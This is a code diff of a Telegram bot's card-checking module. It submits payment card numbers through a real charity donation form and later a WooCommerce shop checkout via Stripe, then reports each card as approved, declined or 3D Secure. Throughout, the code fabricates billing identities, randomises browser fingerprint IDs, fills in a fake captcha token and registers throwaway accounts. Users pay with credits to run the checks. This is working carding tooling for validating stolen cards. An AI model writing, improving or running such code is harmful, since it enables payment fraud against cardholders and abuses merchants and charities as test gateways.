+            return None, f"Token extraction failed: {str(e)}"
+
+    def get_pickup_timestamp(self):
+        """Get timestamp for pickup 5 days from now"""
+        try:
+            # Get date 5 days from now
+            future_date = datetime.now() + timedelta(days=5)
+            # Set time to 8:00 AM (morning slot)
+            future_date = future_date.replace(hour=8, minute=0, second=0, microsecond=0)
+            # Convert to Unix timestamp
+            timestamp = int(future_date.timestamp())
+            return str(timestamp)
+        except Exception as e:
+            # Fallback to 5 days from now in seconds
+            return str(int(time.time()) + (5 * 24 * 60 * 60))
 
     async def create_stripe_payment_method(self, client, card_details, user_info):
         """Create Stripe payment method"""
         try:
             cc, mes, ano, cvv = card_details
 
-            logger.step(2, 4, "Creating Stripe payment method...")
+            logger.step(5, 6, "Creating payment method...")
 
-            # Generate realistic Stripe identifiers
-            client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
-            guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
-            muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
-            sid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
+            # Generate GUIDs
+            guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
+            muid = "857a23e2-aad1-474f-abfc-005a83643b49d191d7"
+            sid = "ae21e30c-4df0-49b2-9ffa-111c74f5663d3fc7ac"
 
             payment_data = {
-                'type': 'card',
                 'billing_details[name]': f"{user_info['first_name']} {user_info['last_name']}",
                 'billing_details[email]': user_info['email'],
-                'billing_details[address][postal_code]': '10080',
+                'billing_details[phone]': user_info['phone'],
+                'billing_details[address][city]': user_info['city'],
+                'billing_details[address][country]': 'AU',
+                'billing_details[address][line1]': user_info['address'],
+                'billing_details[address][line2]': '',
+                'billing_details[address][postal_code]': user_info['postcode'],
+                'billing_details[address][state]': user_info['state'],
+                'type': 'card',
                 'card[number]': cc,
                 'card[cvc]': cvv,
-                'card[exp_month]': mes,
                 'card[exp_year]': ano[-2:],
+                'card[exp_month]': mes,
                 'allow_redisplay': 'unspecified',
                 'pasted_fields': 'number',
-                'payment_user_agent': f'stripe.js/{random.choice(["eeaff566a9", "065b474d33"])}; stripe-js-v3/{random.choice(["eeaff566a9", "065b474d33"])}; card-element',
+                'payment_user_agent': 'stripe.js/eeaff566a9; stripe-js-v3/eeaff566a9; payment-element; deferred-intent',
                 'referrer': self.base_url,
-                'time_on_page': str(random.randint(30000, 90000)),
-                'client_attribution_metadata[client_session_id]': client_session_id,
+                'time_on_page': str(random.randint(150000, 200000)),
+                'client_attribution_metadata[client_session_id]': f"{random.randint(10000000, 99999999)}-7ff0-432d-8c41-60ef1e1bd182",
+                'client_attribution_metadata[merchant_integration_source]': 'elements',
+                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
+                'client_attribution_metadata[merchant_integration_version]': '2021',
+                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
+                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
+                'client_attribution_metadata[elements_session_config_id]': f"{random.randint(10000000, 99999999)}-7cfd-43e9-9c0d-a28871afe9ee",
+                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                 'guid': guid,
                 'muid': muid,
                 'sid': sid,
                 'key': self.stripe_key,
-                '_stripe_version': '2024-06-20'
+                '_stripe_version': '2024-06-20',
+                'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.test_token'
             }
 
             stripe_headers = {
-                'authority': 'api.stripe.com',
-                'accept': 'application/json',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://js.stripe.com',
-                'referer': 'https://js.stripe.com/',
-                'user-agent': self.user_agent,
-                'sec-ch-ua': self.sec_ch_ua,
-                'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
-                'sec-ch-ua-platform': self.sec_ch_ua_platform
+                "User-Agent": self.user_agent,
+                "Accept": "application/json",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": "https://js.stripe.com",
+                "Referer": "https://js.stripe.com/",
             }
 
-            logger.stripe("Sending request to Stripe API...")
-            await asyncio.sleep(random.uniform(0.5, 1.5))
-
-            response = await client.post(
-                "https://api.stripe.com/v1/payment_methods",
-                data=payment_data,
-                headers=stripe_headers
-            )
-
-            logger.debug_response(f"Stripe response: {response.status_code}")
+            # Use separate client for Stripe
+            async with httpx.AsyncClient() as stripe_client:
+                response = await stripe_client.post(
+                    "https://api.stripe.com/v1/payment_methods",
+                    data=payment_data,
+                    headers=stripe_headers,
+                    timeout=30.0
+                )
 
             if response.status_code == 200:
                 result = response.json()
                 payment_method_id = result.get('id')
                 if payment_method_id:
-                    logger.success(f"✅ Payment method created: {payment_method_id}")
+                    logger.success(f"Payment method created: {payment_method_id}")
                     return {'success': True, 'payment_method_id': payment_method_id}
                 else:
                     return {'success': False, 'error': 'No payment method ID'}
@@ -625,173 +768,184 @@ class StripeChargeChecker:
                 try:
                     error_data = response.json()
                     error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')
-
-                    logger.error(f"Stripe error: {error_msg}")
                     return {'success': False, 'error': error_msg}
                 except:
                     return {'success': False, 'error': 'Stripe API error'}
 
         except Exception as e:
-            logger.error(f"Payment method error: {str(e)}")
             return {'success': False, 'error': f"Payment method error: {str(e)}"}
 
-    async def submit_donation(self, client, tokens, payment_method_id, user_info):
-        """Submit donation to Michigan Chapter and get real response"""
+    async def process_checkout(self, client, tokens, payment_method_id, user_info):
+        """Process checkout with detailed logging and error parsing"""
         try:
-            logger.step(3, 4, "Submitting donation to Michigan Chapter...")
+            logger.step(6, 6, "Processing checkout...")
 
-            donation_data = {
-                'charitable_form_id': tokens['charitable_form_id'],
-                tokens['charitable_form_id']: '',
-                '_charitable_donation_nonce': tokens['donation_nonce'],
-                '_wp_http_referer': tokens['_wp_http_referer'],
-                'campaign_id': tokens['campaign_id'],
-                'description': self.campaign_description,
-                'ID': '0',
-                'custom_donation_amount': '10.00',
-                'recurring_donation': 'once',  # Added based on the payload
-                'first_name': user_info['first_name'],
-                'last_name': user_info['last_name'],
-                'email': user_info['email'],
-                'additiona_message': 'Support our cause and help those in need',
-                'anonymous_donation': '1',
-                'gateway': 'stripe',
-                'stripe_payment_method': payment_method_id,
-                'cover_fees': '1',
-                'action': 'make_donation',
-                'form_action': 'make_donation'
+            # Get pickup timestamp (5 days ahead)
+            pickup_timestamp = self.get_pickup_timestamp()
+
+            checkout_data = {
+                'wc-ajax': 'checkout',
+                'wc_order_attribution_source_type': 'typein',
+                'wc_order_attribution_referrer': '(none)',
+                'wc_order_attribution_utm_campaign': '(none)',
+                'wc_order_attribution_utm_source': '(direct)',
+                'wc_order_attribution_utm_medium': '(none)',
+                'wc_order_attribution_utm_content': '(none)',
+                'wc_order_attribution_utm_id': '(none)',
+                'wc_order_attribution_utm_term': '(none)',
+                'wc_order_attribution_utm_source_platform': '(none)',
+                'wc_order_attribution_utm_creative_format': '(none)',
+                'wc_order_attribution_utm_marketing_tactic': '(none)',
+                'wc_order_attribution_session_entry': f'{self.base_url}/my-account/',
+                'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'wc_order_attribution_session_pages': '6',
+                'wc_order_attribution_session_count': '1',
+                'wc_order_attribution_user_agent': self.user_agent,
+                'billing_email': user_info['email'],
+                'billing_first_name': user_info['first_name'],
+                'billing_last_name': user_info['last_name'],
+                'billing_country': 'AU',
+                'billing_address_1': user_info['address'],
+                'billing_address_2': '',
+                'billing_city': user_info['city'],
+                'billing_state': user_info['state'],
+                'billing_postcode': user_info['postcode'],
+                'billing_phone': user_info['phone'],
+                'shipping_first_name': '',
+                'shipping_last_name': '',
+                'shipping_company': '',
+                'shipping_country': 'AU',
+                'shipping_address_1': '',
+                'shipping_address_2': '',
+                'shipping_city': '',
+                'shipping_state': user_info['state'],
+                'shipping_postcode': '',
+                'order_comments': '',
+                'shipping_method[0]': 'local_pickup:7',
+                'local_pickup_time_select': pickup_timestamp,
+                '_wlptnonce': tokens['wlptnonce'],
+                '_wp_http_referer': '/?wc-ajax=update_order_review',
+                'payment_method': 'stripe',
+                'wc-stripe-payment-method-upe': '',
+                'wc_stripe_selected_upe_payment_type': '',
+                'wc-stripe-is-deferred-intent': '1',
+                'terms': 'on',
+                'terms-field': '1',
+                'woocommerce-process-checkout-nonce': tokens['checkout_nonce'],
+                '_wp_http_referer': '/?wc-ajax=update_order_review',
+                'wc-stripe-payment-method': payment_method_id
             }
 
-            donation_headers = {
-                **self.get_base_headers(),
+            checkout_headers = {
                 "Accept": "application/json, text/javascript, */*; q=0.01",
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                 "X-Requested-With": "XMLHttpRequest",
                 "Origin": self.base_url,
-                "Referer": f"{self.base_url}{self.campaign_path}",
-                "Cookie": f"__stripe_mid={''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}; charitable_session={''.join(random.choices('0123456789abcdef', k=32))}; __stripe_sid={''.join(random.choices(string.ascii_lowercase + string.digits, k=32))}"
+                "Referer": f"{self.base_url}/checkout/",
+                "User-Agent": self.user_agent
             }
 
-            logger.network(f"Using payment method: {payment_method_id}")
-
-            response = await client.post(
-                f"{self.base_url}/wp-admin/admin-ajax.php",
-                data=donation_data,
-                headers=donation_headers
+            response = await self.make_request(
+                client, 'POST', f"{self.base_url}/?wc-ajax=checkout",
+                headers=checkout_headers, data=checkout_data
             )
 
-            logger.debug_response(f"Donation response: {response.status_code}")
+            response_text = response.text
 
             if response.status_code != 200:
+                logger.error(f"Checkout failed with status: {response.status_code}")
                 return {
                     'success': False,
                     'status': 'DECLINED',
                     'message': f"Server error: {response.status_code}"
                 }
 
-            # Try to parse as JSON first
+            # Try to parse JSON response
             try:
                 result = response.json()
-                logger.debug_response(f"JSON Response: {json.dumps(result, indent=2)}")
 
                 if isinstance(result, dict):
-                    # Check for REAL 3D Secure (requires_action = real 3D Secure)
-                    if result.get('requires_action') is True:
-                        logger.success("🔐 REAL 3D Secure detected (requires_action)")
+                    # CHECK: If this is a 3D Secure or deferred payment
+                    if self.is_secure_required_response(result):
+                        logger.warning("🔐 3D Secure/Deferred payment detected - marking as DECLINED")
                         return {
                             'success': True,
                             'status': 'DECLINED',
                             'message': '3D SECURE❎'
                         }
 
-                    if result.get('success') is True:
-                        # Check if there's a redirect URL (real success)
-                        if 'redirect_to' in result and not result.get('requires_action'):
-                            redirect_url = result['redirect_to']
-                            logger.success(f"✅ Real success with redirect: {redirect_url}")
+                    if result.get('result') == 'success' and result.get('redirect'):
+                        # Double check if it's really successful or requires confirmation
+                        redirect_url = result.get('redirect', '').lower()
+
+                        # If redirect contains confirmation patterns, it's likely 3D Secure
+                        if any(pattern in redirect_url for pattern in ['confirm-pi', 'pi_', '_secret_', 'requires_']):
+                            logger.warning("⚠️ Success with confirmation URL - marking as 3D SECURE")
                             return {
                                 'success': True,
-                                'status': 'APPROVED',
-                                'message': 'Successfully Charged'
-                            }
-                        else:
-                            # Success without redirect - check if there are any errors
-                            if 'errors' in result and result['errors']:
-                                error_msg = result['errors'][0]
-                                logger.warning(f"❌ Success but has errors: {error_msg}")
-                                return {
-                                    'success': False,
-                                    'status': 'DECLINED',
-                                    'message': error_msg
-                                }
-                            else:
-                                logger.success("✅ Success without redirect")
-                                return {
-                                    'success': True,
-                                    'status': 'APPROVED',
-                                    'message': 'Successfully Charged'
-                                }
-                    else:
-                        # Explicit failure in JSON
-                        if 'errors' in result and result['errors']:
-                            error_msg = result['errors'][0]
-                            error_msg = re.sub(r'<[^>]+>', '', error_msg).strip()
-
-                            # Check if this is REAL 3D Secure in error message
-                            if "3d_secure" in error_msg.lower() or "authentication_required" in error_msg.lower():
-                                logger.success("🔐 REAL 3D Secure detected in error")
-                                return {
-                                    'success': True,
-                                    'status': 'DECLINED',
-                                    'message': '3D SECURE❎'
-                                }
-
-                            logger.warning(f"❌ JSON error: {error_msg}")
-                            return {
-                                'success': False,
                                 'status': 'DECLINED',
-                                'message': error_msg
+                                'message': '3D SECURE❎'
                             }
-                        else:
-                            logger.warning("❌ Generic JSON decline")
+
+                        logger.success("Checkout successful - Payment APPROVED")
+                        return {
+                            'success': True,
+                            'status': 'APPROVED',
+                            'message': 'Successfully Charged 1$'
+                        }
+
+                    if result.get('result') == 'failure':
+                        logger.warning(f"Checkout failed with result: failure")
+                        
+                        # Extract error message from the response
+                        error_msg = ""
+                        if 'messages' in result and result['messages']:
+                            error_msg = result['messages']
+                            logger.warning(f"Raw error messages: {error_msg}")
+                        
+                        # Parse the HTML error to get clean message
+                        clean_error = self.extract_error_from_html(error_msg)
+                        logger.warning(f"Extracted error: {clean_error}")
+
+                        # Check for 3D Secure in error message
+                        if '3d_secure' in error_msg.lower() or 'authentication' in error_msg.lower():
+                            logger.warning("🔐 3D Secure authentication required")
                             return {
-                                'success': False,
+                                'success': True,
                                 'status': 'DECLINED',
-                                'message': 'Payment declined'
+                                'message': '3D SECURE❎'
                             }
-                else:
-                    logger.error("Unexpected JSON format")
-                    return {
-                        'success': False,
-                        'status': 'DECLINED',
-                        'message': 'Unexpected response format'
-                    }
 
-            except json.JSONDecodeError:
-                # If not JSON, it's HTML - this means JavaScript requirement
-                html_response = response.text
-                logger.warning("Response is HTML - JavaScript requirement detected")
+                        # Return the actual error message
+                        logger.warning(f"❌ Checkout error: {clean_error}")
+                        return {
+                            'success': False,
+                            'status': 'DECLINED',
+                            'message': clean_error
+                        }
 
-                # Check for specific JavaScript error message
-                if 'Javascript' in html_response or 'javascript' in html_response:
-                    logger.error("❌ JavaScript required - cannot process")
-                    return {
-                        'success': False,
-                        'status': 'DECLINED',
-                        'message': 'JavaScript required - payment cannot be processed'
-                    }
+                # If we get here, the response format is unexpected
+                logger.warning(f"Unexpected JSON response format: {result}")
+                return {
+                    'success': False,
+                    'status': 'DECLINED',
+                    'message': 'Unexpected response format'
+                }
 
-                # Check for other error messages in HTML
-                decline_message = self.extract_decline_message(html_response)
-                if decline_message:
-                    logger.warning(f"❌ HTML decline message: {decline_message}")
+            except json.JSONDecodeError as json_error:
+                logger.error(f"JSON parse error: {json_error}")
+
+                # Try to extract error from HTML response
+                decline_message = self.extract_error_from_html(response_text)
+                if decline_message and decline_message != "Payment declined":
+                    logger.warning(f"Extracted error from HTML: {decline_message}")
                     return {
                         'success': False,
                         'status': 'DECLINED',
                         'message': decline_message
                     }
                 else:
-                    logger.warning("❌ Generic HTML decline")
+                    logger.warning("Could not extract error message from response")
                     return {
                         'success': False,
                         'status': 'DECLINED',
@@ -799,48 +953,19 @@ class StripeChargeChecker:
                     }
 
         except Exception as e:
-            logger.error(f"Donation submission error: {str(e)}")
+            logger.error(f"Checkout processing error: {str(e)}")
             return {
                 'success': False,
                 'status': 'DECLINED',
-                'message': f"Processing error: {str(e)}"
+                'message': f"Processing error: {str(e)[:100]}"
             }
 
-    def extract_decline_message(self, html):
-        """Extract decline message from HTML"""
-        try:
-            patterns = [
-                r'Your card was declined[^<]*',
-                r'declined[^<.!?]*[.!?]',
-                r'insufficient funds[^<]*',
-                r'card does not support[^<]*',
-                r'security code.*incorrect[^<]*',
-                r'contact your card issuer[^<]*',
-                r'authentication is not available[^<]*',
-                r'this card type is not accepted[^<]*',
-                r'card not supported[^<]*',
-                r'unsupported card[^<]*'
-            ]
-
-            for pattern in patterns:
-                matches = re.findall(pattern, html, re.IGNORECASE)
-                for match in matches:
-                    if match and len(match.strip()) > 5:
-                        return match.strip()
-
-            return None
-        except:
-            return None
-
     async def check_card(self, card_details, username, user_data):
-        """Main card checking method - called by ChargeCommandProcessor"""
+        """Main card checking method - OPTIMIZED"""
         start_time = time.time()
-        cc, mes, ano, cvv = "", "", "", ""
-        client = None
+        logger.info(f"🔍 Starting Stripe Charge 1$ check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")
 
         try:
-            logger.info(f"🔍 Starting Stripe Charge check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")
-
             cc_parts = card_details.split('|')
             if len(cc_parts) < 4:
                 return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)
@@ -850,7 +975,6 @@ class StripeChargeChecker:
             ano = cc_parts[2].strip()
             cvv = cc_parts[3].strip()
 
-            # Validate card details
             if not cc.isdigit() or len(cc) < 15:
                 return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)
 
@@ -866,94 +990,100 @@ class StripeChargeChecker:
             if len(ano) == 2:
                 ano = '20' + ano
 
-            # Get BIN info with proper flag handling
             bin_info = await self.get_bin_info(cc)
             logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")
 
-            # Generate user details
-            first_names = ["John", "Jane", "Robert", "Mary", "David", "Sarah", "Michael", "Lisa", "James", "Emma"]
-            last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
+            # Get random Australian address
+            address_info = random.choice(self.au_addresses)
 
-            first_name = random.choice(first_names)
-            last_name = random.choice(last_names)
-            domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
-            domain = random.choice(domains)
-            email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1000,9999)}@{domain}"
+            # Generate random email
+            random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+            email = f"{random_string}@gmail.com"
 
             user_info = {
-                'first_name': first_name,
-                'last_name': last_name,
-                'email': email
+                'first_name': address_info['first_name'],
+                'last_name': address_info['last_name'],
+                'email': email,
+                'address': address_info['address'],
+                'city': address_info['city'],
+                'postcode': address_info['postcode'],
+                'phone': address_info['phone'],
+                'state': address_info['state'],
+                'country': address_info['country']
             }
 
-            logger.user(f"User: {first_name} {last_name} | {email}")
+            logger.user(f"User: {user_info['first_name']} {user_info['last_name']} | {email} | {user_info['phone']}")
 
-            # Create HTTP client
-            client = httpx.AsyncClient(
+            async with httpx.AsyncClient(
                 timeout=30.0,
                 follow_redirects=True,
                 limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
                 http2=True
-            )
+            ) as client:
 
-            # Step 1: Get form tokens
-            tokens, error = await self.get_form_tokens(client)
-            if not tokens:
-                await client.aclose()
-                return await self.format_response(cc, mes, ano, cvv, "ERROR", error, username, time.time()-start_time, user_data, bin_info)
+                # Step 1: Initialize session
+                if not await self.initialize_session(client):
+                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session", username, time.time()-start_time, user_data, bin_info)
 
-            # Step 2: Create payment method
-            payment_result = await self.create_stripe_payment_method(client, (cc, mes, ano, cvv), user_info)
-            if not payment_result['success']:
-                await client.aclose()
-                return await self.format_response(cc, mes, ano, cvv, "DECLINED", payment_result['error'], username, time.time()-start_time, user_data, bin_info)
+                # Step 2: Register account
+                reg_success, email_used, reg_error = await self.register_account(client)
+                if not reg_success:
+                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", reg_error, username, time.time()-start_time, user_data, bin_info)
+                
+                user_info['email'] = email_used
 
-            # Step 3: Submit donation
-            result = await self.submit_donation(client, tokens, payment_result['payment_method_id'], user_info)
+                # Step 3: Add product to cart
+                add_success, error = await self.add_product_to_cart(client)
+                if not add_success:
+                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error, username, time.time()-start_time, user_data, bin_info)
 
-            await client.aclose()
+                # Step 4: Get checkout tokens
+                tokens, token_error = await self.get_checkout_tokens(client)
+                if not tokens:
+                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", token_error, username, time.time()-start_time, user_data, bin_info)
 
-            elapsed_time = time.time() - start_time
-            logger.success(f"Card check completed in {elapsed_time:.2f}s - Status: {result['status']}")
+                # Step 5: Create Stripe payment method
+                payment_result = await self.create_stripe_payment_method(client, (cc, mes, ano, cvv), user_info)
+                if not payment_result['success']:
+                    error_msg = payment_result['error']
+                    logger.warning(f"Payment method creation failed: {error_msg}")
+                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)
 
-            return await self.format_response(cc, mes, ano, cvv, result['status'], result['message'], username, elapsed_time, user_data, bin_info)
+                # Step 6: Process checkout
+                result = await self.process_checkout(client, tokens, payment_result['payment_method_id'], user_info)
+
+                elapsed_time = time.time() - start_time
+                logger.success(f"Card check completed in {elapsed_time:.2f}s - Status: {result['status']} - Message: {result['message']}")
+
+                return await self.format_response(cc, mes, ano, cvv, result['status'], result['message'], username, elapsed_time, user_data, bin_info)
 
         except httpx.TimeoutException:
             logger.error("Request timeout")
-            if client:
-                await client.aclose()
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
         except httpx.ConnectError:
             logger.error("Connection error")
-            if client:
-                await client.aclose()
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
         except Exception as e:
             logger.error(f"Unexpected error: {str(e)}")
-            if client:
-                await client.aclose()
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
 
-# Command handler for /xc command only
-@Client.on_message(filters.command(["xc", ".xc", "$xc"]))
+# Command handler - CORRECTED WITH UNIVERSAL CHARGE PROCESSOR
+@Client.on_message(filters.command(["xo", ".xo", "$xo"]))
 @auth_and_free_restricted
-async def handle_stripe_charge(client: Client, message: Message):
+async def handle_stripe_charge_1(client: Client, message: Message):
     try:
         user_id = message.from_user.id
         username = message.from_user.username or str(user_id)
 
-        # Check if command is disabled
-        try:
-            from BOT.helper.Admins import is_command_disabled, get_command_offline_message
-            command_text = message.text.split()[0]
-            command_name = command_text.lstrip('/.$')
+        # CHECK: First check if command is disabled
+        command_text = message.text.split()[0]
+        command_name = command_text.lstrip('/.$')
 
-            if is_command_disabled(command_name):
-                await message.reply(get_command_offline_message(command_text))
-                return
-        except ImportError:
-            pass
+        if is_command_disabled(command_name):
+            await message.reply(get_command_offline_message(command_text))
+            return
 
+        # Check if user is banned
         if is_user_banned(user_id):
             await message.reply("""<pre>⛔ User Banned</pre>
 ━━━━━━━━━━━━━
@@ -962,6 +1092,7 @@ async def handle_stripe_charge(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
 
+        # Load user data
         users = load_users()
         user_id_str = str(user_id)
         if user_id_str not in users:
@@ -977,7 +1108,7 @@ async def handle_stripe_charge(client: Client, message: Message):
         plan_name = user_plan.get("plan", "Free")
 
         # Check cooldown (owner is automatically skipped in check_cooldown function)
-        can_use, wait_time = check_cooldown(user_id, "xc")
+        can_use, wait_time = check_cooldown(user_id, "xo")
         if not can_use:
             await message.reply(f"""<pre>⏳ Cooldown Active</pre>
 ━━━━━━━━━━━━━
@@ -987,28 +1118,23 @@ async def handle_stripe_charge(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
 
-        # Check command arguments
         args = message.text.split()
         if len(args) < 2:
-            # Use charge_processor for usage message if available
-            if CREDIT_SYSTEM_AVAILABLE and charge_processor:
-                usage_msg = charge_processor.get_usage_message(
-                    command_name="xc",
-                    gateway_name="Stripe Charge 10$",
-                    example_card="4111111111111111|12|2025|123"
-                )
-                await message.reply(usage_msg)
+            if charge_processor:
+                await message.reply(charge_processor.get_usage_message(
+                    "xo", 
+                    "Stripe Charge 1$",
+                    "4111111111111111|12|2025|123"
+                ))
             else:
-                await message.reply("""<pre>#WAYNE ─[STRIPE CHARGE]─</pre>
+                await message.reply("""<pre>#WAYNE ─[STRIPE CHARGE 1$]─</pre>
 ━━━━━━━━━━━━━
-⟐ <b>Command</b>: <code>/xc</code> or <code>.xc</code> or <code>$xc</code>
-⟐ <b>Usage</b>: <code>/xc cc|mm|yy|cvv</code>
-⟐ <b>Example</b>: <code>/xc 4111111111111111|12|2025|123</code>
-⟐ <b>Gate</b>: Stripe Charge 10$ ♻️
+⟐ <b>Command</b>: <code>/xo</code> or <code>.xo</code> or <code>$xo</code>
+⟐ <b>Usage</b>: <code>/xo cc|mm|yy|cvv</code>
+⟐ <b>Example</b>: <code>/xo 4111111111111111|12|2025|123</code>
 ━━━━━━━━━━━━━
-<b>~ Note:</b> <code>Tests card with $10 charge via Stripe (Deducts 2 credits)</code>
-<b>~ Note:</b> <code>Credits are ONLY deducted when check actually runs and completes</code>
-<b>~ Note:</b> <code>If check fails to start, NO credits are deducted</code>""")
+<b>~ Note:</b> <code>Charges 1$ via Stripe gateway (Deducts 2 credits AFTER check completes)</code>
+<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
             return
 
         card_details = args[1].strip()
@@ -1028,43 +1154,44 @@ async def handle_stripe_charge(client: Client, message: Message):
         ano = cc_parts[2]
         cvv = cc_parts[3]
 
+        # Show processing message
+        processing_msg = await message.reply(
+            charge_processor.get_processing_message(
+                cc, mes, ano, cvv, username, plan_name, 
+                "Stripe Charge 1$", "xo"
+            ) if charge_processor else f"""<b>「$cmd → /xo」| <b>WAYNE</b> </b>
+━━━━━━━━━━━━━━━
+<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
+<b>[•] Gateway -</b> Stripe Charge 1$
+<b>[•] Status-</b> Processing... ⏳
+━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+<b>[+] Plan:</b> {plan_name}
+<b>[+] User:</b> @{username}
+━━━━━━━━━━━━━━━
+<b>Checking card... Please wait.</b>"""
+        )
+
         # Create checker instance
-        checker = StripeChargeChecker()
+        checker = StripeCharge1Checker()
 
-        # Get processing message using charge_processor if available
-        if CREDIT_SYSTEM_AVAILABLE and charge_processor:
-            processing_msg = charge_processor.get_processing_message(
-                cc=cc,
-                mes=mes,
-                ano=ano,
-                cvv=cvv,
-                username=username,
-                user_plan=plan_name,
-                gateway_name="Stripe Charge 10$",
-                command_name="xc"
-            )
-        else:
-            processing_msg = checker.get_processing_message(cc, mes, ano, cvv, username, plan_name)
-
-        processing_msg_obj = await message.reply(processing_msg)
-
-        # Use universal charge processor if available
-        if CREDIT_SYSTEM_AVAILABLE and charge_processor:
-            # CORRECTED: Pass arguments in correct order for execute_charge_command
+        # Process command through universal charge processor
+        if charge_processor:
             success, result, credits_deducted = await charge_processor.execute_charge_command(
-                user_id,                    # positional: user_id
-                checker.check_card,         # positional: check_callback
-                card_details, username, user_data,  # positional: *check_args
-                credits_needed=2,
-                command_name="xc",
-                gateway_name="Stripe Charge 10$"
+                user_id,                    # positional
+                checker.check_card,         # positional
+                card_details,               # check_args[0]
+                username,                   # check_args[1]
+                user_data,                  # check_args[2]
+                credits_needed=2,           # keyword
+                command_name="xo",          # keyword
+                gateway_name="Stripe Charge 1$"  # keyword
             )
 
-            await processing_msg_obj.edit_text(result, disable_web_page_preview=True)
+            await processing_msg.edit_text(result, disable_web_page_preview=True)
         else:
             # Fallback to old method if charge_processor not available
             result = await checker.check_card(card_details, username, user_data)
-            await processing_msg_obj.edit_text(result, disable_web_page_preview=True)
+            await processing_msg.edit_text(result, disable_web_page_preview=True)
 
     except Exception as e:
         error_msg = str(e)[:150]
